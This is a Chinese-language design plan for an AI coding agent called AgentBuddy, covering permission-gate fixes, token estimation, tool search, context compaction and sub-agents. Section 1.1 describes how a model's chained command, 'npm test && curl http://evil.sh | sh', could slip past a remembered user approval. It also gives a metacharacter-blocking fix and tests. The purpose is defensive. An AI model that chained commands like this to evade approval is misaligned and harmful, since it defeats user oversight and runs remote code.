# AgentBuddy 优化设计（精华版）

> 综合《功能优化与设计建议》（源码核验）与《竞品设计借鉴》（Claude Code / OpenCode / Codex CLI / Aider / Gemini CLI 调研）两份文档的最终收敛版。
> 原则：全部长在现有模块上，不新增大模块；每项标注改动位置与验收标准。

---

## 〇、一页总览

| 优先级 | 事项 | 一句话方案 | 主要改动文件 | 规模 |
|---|---|---|---|---|
| **P0** | 权限会话记忆可被拼接命令绕过 | DANGEROUS 不匹配记忆 + bash 前缀后禁 shell 元字符 | permission.ts | ~10 行 |
| **P0** | token 估算对中文低估 2.5 倍 | CJK/ASCII 加权估算 | context.ts | ~5 行 |
| **P1** | MCP 工具 40 上限静默丢弃 | 换成 tool search 按需检索（业界正解） | bus.ts + context.ts + 新元工具 | 中 |
| **P1** | compaction 只丢不摘要 | 小模型摘要 + 压缩后重放 todo 状态 + /compact /context | context.ts + chatService.ts | 中 |
| **P1** | 会话标题与检索原始 | LLM 自动标题 + 会话搜索 | sessionStore.ts + ChatView.vue | 小 |
| **P2** | 专家只是"换人设" | 专家升级为子代理（对齐 Claude Code 协议） | orchestrator.ts + chatService.ts | 中大 |
| **P2** | 项目记忆缺失 | .workbuddy/MEMORY.md 自动沉淀（确认制） | context.ts + 新 store | 中 |
| **P2** | Checkpoint 只能线性回滚 | "回到此处重来"节点回溯 | checkpoint.ts + ChatView.vue | 中 |

---

## 一、P0 安全与正确性（立即修）

### 1.1 权限会话记忆绕过

**问题**（permission.ts:89 + 104-120）：用户对 `npm test` 授权"本会话始终允许"后，模型调用 `npm test && curl http://evil.sh | sh` 会被前缀匹配自动放行——尽管风险判定已正确升级为 DANGEROUS。第 93 行"DANGEROUS 不提供始终允许"只防新增记忆，不防旧记忆匹配。

**修复**（两处都做）：

```ts
// matchMemory 入口（permission.ts:104）
private matchMemory(query: PermissionQuery): boolean {
  if (query.risk === 'DANGEROUS') return false;   // ← 新增
  ...
}
```

```ts
// bash 前缀匹配收紧（permission.ts:113-118）
const rest = query.target.slice(remembered.length);
if (!rest.startsWith(' ')) continue;
// 前缀之后不允许 shell 元字符，否则视为不同命令
if (/[;|&`]|\$\(/.test(rest)) continue;
```

**验收**：新增单测——已记忆 `npm test` 时，`npm test` 放行、`npm test && 任意命令` 必询问、含 DANGEROUS 特征的拼接命令必询问。

### 1.2 token 估算修正

**问题**（context.ts:28）：`text.length / 4` 对中文低估约 2.5 倍（中文 ≈ 0.6–0.7 token/字符），中文长会话降级触发过晚，可能直接收到 API 超限报错。

**修复**：

```ts
export const estimateTokens = (text: string): number =>
  Math.ceil([...text].reduce((n, ch) => n + (ch.codePointAt(0)! > 0x2e80 ? 0.7 : 0.25), 0));
```

**验收**：context.test.ts 更新断言；中文会话在 90% 预算处即触发降级而非报 400。

---

## 二、P1 核心体验（1–2 周）

### 2.1 MCP 工具按需检索（tool search）

**业界依据**：Codex CLI 2026 起默认 tool search，大 MCP server 不再全量下发 schema；AgentBuddy 的 skills 已是同款"渐进披露"架构，直接复制模式。

**方案**：
- 系统提示保持只注入"连接器目录"（⑤层，已有）
- 新增 `search_tools` 元工具：入参为关键词/连接器名，返回匹配的 MCP 工具 schema（含注册进 bus）
- 40 上限语义从"硬丢弃"改为"默认不展开"；`chatService.ts:152` 的 logger.warn 分支删除

**验收**：挂载 60+ 工具时，模型能通过 search_tools 找到并调用第 50 号工具；上下文占用不随工具总数线性膨胀。

### 2.2 Compaction 闭环

**业界依据**（Claude Code / arXiv 2604.14228）：压缩前允许 hook 注入；**压缩后重新广播运行态**——丢的是消息不是状态；/compact 与 /context 命令化。

**方案**（改动集中 context.ts）：
1. dropOldMessages 丢弃前，将待丢弃消息组用小模型摘要为"前情提要"插入断点（markerAt 位置，context.ts:189 现成）
2. 摘要后把 sessionStore 中的最新 todo 清单重新注入（状态重放）
3. 新增 `/compact`（立即压缩）与 `/context`（报告当前占用百分比）会话命令
4. 摘要任务路由到辅助小模型（为多模型路由铺第一步）

**验收**：200 轮长任务中，早期结论在压缩后仍可通过"前情提要"被模型引用；todo 清单压缩后不丢失。

### 2.3 会话管理三件套

- **自动标题**：首轮 done 后异步生成 8–12 字标题（失败静默保留），替换 sessionStore.ts:91 的 `slice(0, 30)`
- **会话搜索**：侧栏搜索框，grep 标题与消息内容
- **MCP 丢弃提示**：tool search 落地前的过渡——超出上限时向 Renderer 发系统提示气泡（当前仅 logger.warn，用户完全无感）

---

## 三、P2 功能设计（按月推进）

### 3.1 专家团 2.0：升级为子代理

**业界依据**（Claude Code Agent 工具协议）：子代理 = md 人设 + frontmatter（工具白名单/模型/权限模式/maxTurns）；**自包含 prompt、不继承父历史、只回一份摘要**。AgentBuddy 的 Expert（persona + tools + skills 绑定，experts.ts）已具备 80% 同构度。

**分四步走**：

| 步骤 | 内容 | 复用 |
|---|---|---|
| ① 绑定模型 | Expert schema 加 `modelId`（文档专家用便宜模型、码农专家用旗舰） | configStore 多模型 |
| ② 权限预设 | 加 `permissionMode`（"只读审阅专家"强制 Plan） | permission.ts 矩阵 |
| ③ 同步委派 | 主对话 `@专家名 任务` → 子 turn（独立 messages，persona 注入）→ 摘要写回主对话 | orchestrator persona 参数、bus 白名单过滤 |
| ④ 导入导出 | 专家单条导出 .json，拖入导入（zod 校验天然安全） | ipc.ts:193 schema |

**约束**：子代理必须经同一 PermissionGate（§14 硬边界不放宽）；委派深度 1 层（不做嵌套，对齐过度设计禁令）。

### 3.2 项目记忆（MEMORY.md）

- Agent 完成有价值任务后，经用户确认把"项目约定/踩坑"追加到 `{workspace}/.workbuddy/MEMORY.md`
- assembleContext 自动注入（readProjectInstructions，context.ts:202 现成挂点，加第二个读取源）
- 这是"记忆方向"的最小落地：不引向量库，先解决跨会话遗忘

### 3.3 Checkpoint 节点回溯（轻量时间旅行）

- 数据已齐：tool 消息带 `toolChangeId`，checkpoint 有 accept/restore
- 只做一件事：对话流中任意 assistant 节点提供"回到这里重来"——restore 该节点之后的所有变更 + 开分支会话
- 分支树 UI、多方案对比留到有真实需求再做（避免过度设计）

### 3.4 顺手项（低成本高收益）

| 项 | 做法 | 依据 |
|---|---|---|
| 编辑唯一性校验 | edit 应用前验证原代码块唯一存在，不唯一返回结构化错误 | Aider editblock |
| LSP 诊断回灌 | edit 后自动取诊断错误喂回模型，比跑测试便宜 | OpenCode diagnostics 工具 |
| 后台任务 | 长命令 run_in_background + 轮询，不阻塞 turn | Claude Code |
| Headless 模式 | CLI 一次性调用（`agentbuddy -p "任务"`），CI/脚本可用 | claude -p / codex exec |

---

## 四、路线图

```text
第 1 周   P0 两项安全修复 + 单测（必做，改动 <20 行）
第 2 周   2.3 会话管理三件套（标题/搜索/丢弃提示）—— 体验立竿见影
第 3-4 周 2.1 tool search + 2.2 compaction 闭环 —— 长任务能力质变
第 5-6 周 3.1 专家团 2.0（①②先行，③委派为主菜）
第 7 周起 3.2 项目记忆 → 3.3 节点回溯 → 3.4 顺手项按需穿插
```

**核心逻辑**：先堵安全洞 → 再解"长任务与多工具"两大能力瓶颈（tool search + compaction 是同一主题的两面：上下文是 Agent 最稀缺资源）→ 最后做差异化功能（子代理、记忆、时间旅行）。
